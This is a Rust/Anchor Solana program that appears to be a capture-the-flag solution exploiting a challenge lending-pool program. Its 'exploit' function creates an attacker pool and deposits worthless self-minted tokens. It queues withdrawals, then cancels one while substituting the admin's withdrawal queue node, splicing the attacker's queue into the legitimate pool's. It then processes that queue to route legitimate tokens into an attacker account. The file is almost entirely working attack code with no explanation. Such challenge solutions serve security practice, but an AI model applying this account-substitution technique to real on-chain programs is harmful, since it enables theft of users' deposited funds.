use chall;
use chall::cpi::{create_pool, deposit, request_withdraw, cancel_withdraw_request, process_withdraw_queue};
use anchor_lang::prelude::*;
use anchor_lang::solana_program;
use anchor_spl::associated_token::AssociatedToken;
use solana_program::program::invoke;
use spl_associated_token_account::create_associated_token_account;

use anchor_spl::token::{Token, TokenAccount, Mint};


declare_id!("ze11ic1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn exploit(ctx: Context<Exploit>) -> Result<()> {
        // Create attacker pool
        msg!("Creating pool");
        let create_pool_ix_accounts = chall::cpi::accounts::CreatePoolInstructionAccounts {
            config: ctx.accounts.config.to_account_info(),
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            token_mint: ctx.accounts.attacker_mint.to_account_info(),
            pool_token_account: ctx.accounts.attacker_pool_token_account.to_account_info(),
            withdrawal_queue_header: ctx.accounts.attacker_withdrawal_queue_header.to_account_info(),
            signer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        create_pool(CpiContext::new(
            ctx.accounts.chall.to_account_info(),
            create_pool_ix_accounts
        ))?;

        // Create attacker redeem tokens account
        msg!("Creating attacker redeem tokens account");
        anchor_spl::associated_token::create(
            CpiContext::new(
                ctx.accounts.associated_token_program.to_account_info(),
                anchor_spl::associated_token::Create {
                    payer: ctx.accounts.payer.to_account_info(),
                    associated_token: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
                    authority: ctx.accounts.payer.to_account_info(),
                    mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
                    rent: ctx.accounts.rent.to_account_info(),
                    token_program: ctx.accounts.token_program.to_account_info(),
                    system_program: ctx.accounts.system_program.to_account_info(),
                }
            )
        )?;

        // Mint dummy tokens
        msg!("Minting dummy tokens");
        anchor_spl::token::mint_to(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                anchor_spl::token::MintTo {
                    mint: ctx.accounts.attacker_mint.to_account_info(),
                    to: ctx.accounts.attacker_dummy_token_account.to_account_info(),
                    authority: ctx.accounts.payer.to_account_info(),
                }
            ),
            1000
        )?;

        // Deposit into pool
        msg!("Depositing into pool");
        let deposit_ix_accounts = chall::cpi::accounts::DepositInstructionAccounts {
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            token_mint: ctx.accounts.attacker_mint.to_account_info(),
            pool_token_account: ctx.accounts.attacker_pool_token_account.to_account_info(),
            user: ctx.accounts.payer.to_account_info(),
            user_token_account: ctx.accounts.attacker_dummy_token_account.to_account_info(),
            user_redeem_token_account: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        deposit(
            CpiContext::new(
                ctx.accounts.chall.to_account_info(),
                deposit_ix_accounts
            ),
            100
        )?;

        // Request withdrawals
        msg!("Requesting withdrawals");
        let withdrawal_1_ix_accounts = chall::cpi::accounts::RequestWithdrawInstructionAccounts {
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            withdrawal_queue_header: ctx.accounts.attacker_withdrawal_queue_header.to_account_info(),
            withdrawal_queue_node: ctx.accounts.attacker_withdrawal_queue_node_1.to_account_info(),
            user: ctx.accounts.payer.to_account_info(),
            user_redeem_token_account: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        request_withdraw(
            CpiContext::new(
                ctx.accounts.chall.to_account_info(),
                withdrawal_1_ix_accounts
            ),
            10
        )?;
        let withdrawal_2_ix_accounts = chall::cpi::accounts::RequestWithdrawInstructionAccounts {
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            withdrawal_queue_header: ctx.accounts.attacker_withdrawal_queue_header.to_account_info(),
            withdrawal_queue_node: ctx.accounts.attacker_withdrawal_queue_node_2.to_account_info(),
            user: ctx.accounts.payer.to_account_info(),
            user_redeem_token_account: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        request_withdraw(
            CpiContext::new(
                ctx.accounts.chall.to_account_info(),
                withdrawal_2_ix_accounts
            ).with_remaining_accounts(vec![
                ctx.accounts.attacker_withdrawal_queue_node_1.to_account_info(),
            ]),
            10
        )?;
        let withdrawal_3_ix_accounts = chall::cpi::accounts::RequestWithdrawInstructionAccounts {
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            withdrawal_queue_header: ctx.accounts.attacker_withdrawal_queue_header.to_account_info(),
            withdrawal_queue_node: ctx.accounts.attacker_withdrawal_queue_node_3.to_account_info(),
            user: ctx.accounts.payer.to_account_info(),
            user_redeem_token_account: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        request_withdraw(
            CpiContext::new(
                ctx.accounts.chall.to_account_info(),
                withdrawal_3_ix_accounts
            ).with_remaining_accounts(vec![
                ctx.accounts.attacker_withdrawal_queue_node_2.to_account_info(),
            ]),
            10
        )?;

        // Cancel withdrawal, merging two queues
        msg!("Cancelling withdrawal");
        let cancel_withdrawal_ix_accounts = chall::cpi::accounts::CancelWithdrawRequestInstructionAccounts {
            pool: ctx.accounts.attacker_pool.to_account_info(),
            pool_redeem_tokens_mint: ctx.accounts.attacker_pool_redeem_tokens_mint.to_account_info(),
            withdrawal_queue_header: ctx.accounts.attacker_withdrawal_queue_header.to_account_info(),
            withdrawal_queue_node: ctx.accounts.attacker_withdrawal_queue_node_2.to_account_info(),
            user: ctx.accounts.payer.to_account_info(),
            user_redeem_token_account: ctx.accounts.attacker_pool_redeem_token_account.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        let mut cancel_withdraw_request_ctx = CpiContext::new(
            ctx.accounts.chall.to_account_info(),
            cancel_withdrawal_ix_accounts
        ).with_remaining_accounts(vec![
            ctx.accounts.admin_withdrawal_queue_node.to_account_info(),
        ]);
        cancel_withdraw_request(cancel_withdraw_request_ctx)?;

        // Process withdrawal queue
        msg!("Processing withdrawal queue");
        let process_withdraw_queue_ix_accounts = chall::cpi::accounts::ProcessWithdrawQueueInstructionAccounts {
            pool: ctx.accounts.legit_pool.to_account_info(),
            token_mint: ctx.accounts.legit_mint.to_account_info(),
            pool_token_account: ctx.accounts.legit_pool_token_account.to_account_info(),
            withdrawal_queue_header: ctx.accounts.legit_pool_withdrawal_queue_header.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        let mut process_withdraw_queue_ctx = CpiContext::new(
            ctx.accounts.chall.to_account_info(),
            process_withdraw_queue_ix_accounts
        ).with_remaining_accounts(vec![
            ctx.accounts.admin_withdrawal_queue_node.to_account_info(),
            ctx.accounts.admin_token_account.to_account_info(),
            ctx.accounts.attacker_withdrawal_queue_node_3.to_account_info(),
            ctx.accounts.attacker_legit_token_account.to_account_info(),
        ]);
        process_withdraw_queue(process_withdraw_queue_ctx)?;

        Ok(())
    }

}

#[derive(Accounts)]
pub struct Exploit<'info> {
    /// CHECK: trust me this is fine
    #[account(mut)]
    config: AccountInfo<'info>,

    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_pool: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_pool_redeem_tokens_mint: AccountInfo<'info>,

    /// CHECK: trust me this is fine
    #[account(
        init,
        seeds = [b"ATTACKER_MINT"],
        bump,
        payer = payer,
        mint::authority = payer,
        mint::decimals = 18,
    )]
    attacker_mint: Box<Account<'info, Mint>>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_pool_token_account: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_withdrawal_queue_header: AccountInfo<'info>,

    #[account(mut)]
    admin_token_account: Box<Account<'info, TokenAccount>>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    admin_withdrawal_queue_node: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_withdrawal_queue_node_1: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_withdrawal_queue_node_2: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    attacker_withdrawal_queue_node_3: AccountInfo<'info>,

    #[account(
        init,
        payer = payer,
        associated_token::mint = attacker_mint,
        associated_token::authority = payer,
    )]
    pub attacker_dummy_token_account: Box<Account<'info, TokenAccount>>,
    #[account(mut)]
    pub attacker_legit_token_account: Box<Account<'info, TokenAccount>>,

    /// CHECK: This account must be initialized manually after the mint is created by create_pool, 
    /// as spl-token wants the mint to exist on account init (returning a confusing error about a 
    /// wrong program ID if it does not)
    #[account(mut)]
    pub attacker_pool_redeem_token_account: AccountInfo<'info>,

    #[account(mut)]
    pub legit_mint: Box<Account<'info, Mint>>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    pub legit_pool: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    pub legit_pool_token_account: AccountInfo<'info>,
    /// CHECK: trust me this is fine
    #[account(mut)]
    pub legit_pool_withdrawal_queue_header: AccountInfo<'info>,

    #[account(mut)]
    pub payer: Signer<'info>,

    pub chall: Program<'info, chall::program::Challenge>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub associated_token_program: Program<'info, AssociatedToken>,
}
